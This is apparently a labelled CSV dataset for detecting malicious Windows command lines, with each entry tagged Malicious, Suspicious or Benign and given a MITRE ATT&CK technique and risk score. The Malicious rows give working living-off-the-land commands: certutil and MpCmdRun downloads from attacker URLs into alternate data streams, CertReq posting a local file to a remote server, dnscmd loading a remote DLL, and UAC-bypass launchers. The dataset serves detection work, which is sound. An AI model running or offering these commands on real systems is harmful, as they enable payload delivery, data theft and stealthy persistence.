Prompt,Description,LOLBin,Content,Frequency,Source,Network,Behavioural,History,MITRE ID,MITRE Technique,Score,Type
cscript c:\ads\file.txt:script.vbs,Executes VBScript from ADS via cscript,Yes,Scripts,Rare,Script,No,ADS Script Execution,Used in stealth payloads,T1564.004,Hidden Files and ADS,0.9,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://10.10.10.10/encodedfile,Writes system binary from URL,Yes,Files,Rare,Remote,Yes,Binary Dropper,Used in remote execution,T1105,Ingress Tool Transfer,1,Malicious
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt,Posts local file contents in request — data exfil vector,Yes,Files,Rare,Remote,Yes,Covert Exfiltration,Seen in phishing frameworks,T1041,Exfiltration Over C2,1,Malicious
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/encodedfile,Transfers file to system32 via service utility,Yes,Files,Rare,Remote,Yes,Payload Deployment,Used in remote file drops,T1105,Ingress Tool Transfer,1,Malicious
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \192.168.0.149\dll\wtf.dll,Configures DNS server to load remote DLL,Yes,DLL,Rare,Remote,Yes,Remote DLL Load,Seen in domain persistence,T1574.002,DLL Side-Loading,1,Malicious
eventvwr.exe,Launches Event Viewer — can be used in UAC bypass,Yes,Executable,Rare,Local,No,Privilege Escalation,Used in UAC evasion,T1548.002,Bypass User Account Control,0.8,Malicious
diskshadow> exec calc.exe,Executes program via diskshadow script context,Yes,Executable,Rare,Local,No,Shadow Copy Execution,Known in ransomware attacks,T1003.003,NTDS,0.8,Malicious
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt,Downloads script to alternate data stream,Yes,Script,Rare,Remote,Yes,ADS Delivery,Used in fileless malware,T1564.004,Hidden Files and ADS,1,Malicious
bash.exe -c calc.exe,Launches Windows binary via bash — WSL abuse,Yes,Executable,Rare,Local,No,Cross-platform Execution,Seen in stealth loaders,T1059.004,Unix Shell,0.8,Malicious
ATBroker.exe /start malware,Executes payload via accessibility tool,Yes,Executable,Rare,Local,No,UAC Bypass Vector,Used in privilege escalation,T1546.008,Accessibility Features,0.8,Malicious
AT.exe at 09:00 /interactive /every:m,Creates scheduled task using legacy tool,Yes,System,Rare,Local,No,Task Scheduling,Observed in early malware,T1053.002,At,0.8,Malicious
"rundll32 ""C:\ads\file.txt:ADSDLL.dll""",Executes DLL embedded in alternate data stream,Yes,DLL,Rare,Local,No,ADS DLL Execution,Used in stealth backdoors,T1564.004,Hidden Files and ADS,0.8,Malicious
rundll32.exe shdocvw.dll,Loads shell document DLL — rarely abused,Yes,DLL,Rare,Local,No,DLL Function Execution,Rare but logged in some payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe syssetup.dll,Executes setup-based DLLs,Yes,DLL,Rare,Local,No,Setup Routine Abuse,Seen in stealth installers,T1218.011,Rundll32,0.8,Malicious
rundll32 syssetup.dll,Alternate invocation of system setup DLL,Yes,DLL,Rare,Local,No,UAC Abuse,Documented in privilege abuse,T1548.002,Bypass UAC,0.8,Malicious
Msconfig.exe -5,Launches msconfig with suspicious flag,Yes,Executable,Rare,Local,No,Parameter Abuse,Minimal but trackable,T1202,Indirect Command Execution,0.8,Malicious
expand c:\ADS\file1.bat c:\ADS\file2.bat,Uses expand to duplicate file within ADS,Yes,Files,Rare,Local,No,ADS Write Abuse,Known stealth move,T1564.004,Hidden Files and ADS,0.8,Malicious
expand \10.10.10.10\folder\file.bat c:\ADS\file.txt:file.bat,Transfers and writes remote batch into ADS,Yes,Files,Rare,Remote,Yes,Network Payload Transfer,Used in lateral payload staging,T1105,Ingress Tool Transfer,1,Malicious
hh.exe http://some.url/script.ps1,Executes external PowerShell script via HTML Help,Yes,Script,Rare,Remote,Yes,LOLBin Script Launcher,Seen in Squiblydoo variants,T1218.005,Mshta,1,Malicious
regsvcs.exe AllTheThingsx64.dll,Executes .NET DLL via RegSvcs binary,Yes,DLL,Rare,Script,No,DLL Loader Abuse,Classic LOLBin execution,T1218.009,Regsvr32/Regasm/Regsvcs,0.9,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker/beacon.exe -path c:\temp\beacon.exe,Uses Defender CLI to fetch malicious file,Yes,Executable,Rare,Remote,Yes,LOLBin Downloader,Known in fileless delivery,T1105,Ingress Tool Transfer,1,Malicious
print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe,Writes file via print to ADS — evasion method,No,Files,Rare,Local,No,ADS Delivery,Used in red team persistence,T1564.004,Hidden Files and ADS,0.75,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker/beacon.exe -path c:\temp\nicefile.txt:evil.exe,Downloads directly into ADS using Defender binary,Yes,Files,Rare,Remote,Yes,ADS Loader,Known in sandbox bypass attempts,T1564.004,Hidden Files and ADS,1,Malicious
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe,Loads DLL via Tracker — rare LOLBin execution,No,DLL,Rare,Local,No,DLL Sideload,Abused in stealthy toolkits,T1574.002,DLL Side-Loading,0.75,Malicious
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe,Extracts archive to alternate data stream,Yes,Files,Rare,Local,No,ADS Payload Drop,Observed in weaponized payloads,T1564.004,Hidden Files and ADS,0.8,Malicious
Print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe,Uses print command to copy file — potential masquerade,No,Files,Rare,Local,No,File Masquerading,"Rare in the wild, but logged",T1036.003,Masquerading,0.75,Malicious
makecab \webdavserver\webdav\file.exe C:\Folder\file.cab,Compresses file from WebDAV share — staging method,Yes,Files,Rare,Remote,Yes,Remote Payload Delivery,Seen in red team payloads,T1105,Ingress Tool Transfer,1,Malicious
bginfo.exe bginfo.bgi /popup /nolicprompt,Executes config file for background tool — may hide payload,Yes,Executable,Rare,Local,No,Config-based Execution,Observed in payload injection,T1218,Signed Binary Proxy Execution,0.8,Malicious
pcalua.exe -a calc.exe,Launches binary via Compatibility Assistant,Yes,Executable,Rare,Local,No,UAC Bypass Vector,Used in evasive loaders,T1218,Signed Binary Proxy Execution,0.8,Malicious
regasm.exe AllTheThingsx64.dll,Registers .NET DLL — classic LOLBin method,Yes,DLL,Rare,Script,No,DLL Proxy Execution,Common among evasive payloads,T1218.009,Regsvr32/Regasm/Regsvcs,0.9,Malicious
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,Uses forfiles to launch calculator — scripting abuse,Yes,Executable,Rare,Script,No,Binary Proxy Execution,Seen in script-based attacks,T1202,Indirect Command Execution,0.9,Malicious
findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe,Writes filtered content to ADS — data hiding technique,No,Files,Rare,Script,No,Obfuscation via Redirection,Seen in stealth data exfil,T1564.004,Hidden Files and ADS,0.85,Malicious
tasklist /V,Lists running tasks with details — may indicate recon,No,System,Common,Script,No,System Discovery,Seen in audits,T1057,Process Discovery,0.35,Suspicious
sc query,Enumerates services — useful for recon or legit admin,No,Registry,Common,Script,No,Service Discovery,Neutral,T1007,Service Discovery,0.3,Suspicious
net use Z: \internal\public,Maps a network share — could be lateral movement prep,No,Network,Common,Local,Yes,Mount Remote Resource,Seen in pentests,T1021.002,SMB Admin Shares,0.4,Suspicious
powershell Get-ScheduledTask,Lists all scheduled tasks — common recon tool,No,Script,Common,Script,No,Schedule Enumeration,Used in recon,T1053.005,Scheduled Task,0.45,Suspicious
wmic logicaldisk get name,Queries drive volumes — could be discovery or system mapping,Yes,System,Common,Script,No,Drive Enumeration,"Low threat, but noisy",T1082,System Info Discovery,0.3,Suspicious
notepad.exe,Opens Notepad — basic app launch,No,Executable,Common,Local,No,None,Harmless,—,—,0,Benign
ipconfig /all,Displays IP config — routine IT/admin use,No,System,Common,Local,No,None,Common admin use,—,—,0.05,Benign
echo Hello World,Simple echo test — no threat,No,None,Common,Local,No,None,Harmless,—,—,0,Benign
whoami,Shows current user — typical in dev/ops,No,Identity,Common,Local,No,None,Basic check,—,—,0.1,Benign
dir C:\Users\Public,Lists files — basic file operation,No,Files,Common,Local,No,None,Routine,—,—,0.1,Benign
netstat -ano,Lists active network connections — could be recon or admin,No,Network,Common,Local,No,Network Discovery,Neutral,T1049,System Network Connections,0.3,Suspicious
reg query HKLM\SYSTEM\CurrentControlSet\Services,Enumerates registry keys for services,No,Registry,Common,Script,No,Persistence Recon,Used in audits or malware,T1012,Query Registry,0.4,Suspicious
wmic useraccount list full,Enumerates all user accounts — could be recon,Yes,Identity,Rare,Script,No,Account Enumeration,Seen in red team tools,T1087,Account Discovery,0.45,Suspicious
powershell Get-LocalGroupMember -Group Administrators,Lists admin group members — local recon,No,Identity,Rare,Script,No,Privilege Check,Could support escalation,T1069,Permission Group Discovery,0.4,Suspicious
systeminfo,"Gathers OS version, hostname, etc.",No,System,Common,Local,No,Recon,Used in both admin & APTs,T1082,System Information Discovery,0.3,Suspicious
whoami /all,Lists user privileges — can be misused,No,Identity,Common,Local,No,Privilege Recon,Dual-use command,T1033,Security Context,0.3,Suspicious
"powershell ""Get-WmiObject -Class Win32_Product""",Queries installed programs — can be inventory or discovery,No,System,Common,Script,No,Recon Tool,Known in malware staging,T1518.001,Software Discovery,0.4,Suspicious
schtasks /query /fo LIST /v,Lists all scheduled tasks — potentially lateral prep,Yes,Schedule,Common,Script,No,Task Discovery,Used in recon,T1053.005,Scheduled Task,0.35,Suspicious
query user,Checks logged-in users — can support lateral movement,No,Identity,Common,Local,No,Session Recon,Logged in red team ops,T1087.001,Local Account Discovery,0.35,Suspicious
"powershell ""Get-ItemProperty -Path Registry::...""",Reads specific registry paths — dual use,No,Registry,Common,Script,No,Configuration Check,May reveal persistence,T1012,Query Registry,0.4,Suspicious
cls,Clears the screen — harmless,No,None,Common,Local,No,None,Harmless,—,—,0,Benign
help,Displays built-in help — zero risk,No,None,Common,Local,No,None,Neutral,—,—,0,Benign
cd C:\Users\Public,Changes directory — common file operation,No,Files,Common,Local,No,None,Legit use,—,—,0.05,Benign
set,Lists environment variables — typically harmless,No,System,Common,Local,No,None,Scripting use,—,—,0.1,Benign
hostname,Returns current machine name,No,Identity,Common,Local,No,None,Normal use,—,—,0.05,Benign
copy con test.txt,Creates a text file from CLI input,No,Files,Common,Local,No,None,Harmless scripting,—,—,0.1,Benign
date /t,Displays current date — harmless,No,System,Common,Local,No,None,Info only,—,—,0,Benign
time /t,Displays time — harmless,No,System,Common,Local,No,None,Info only,—,—,0,Benign
type nul > log.txt,Creates empty file — safe usage,No,Files,Common,Local,No,None,Automation-related,—,—,0.05,Benign
notepad log.txt,Opens a text file in Notepad,No,Files,Common,Local,No,None,Normal usage,—,—,0.05,Benign
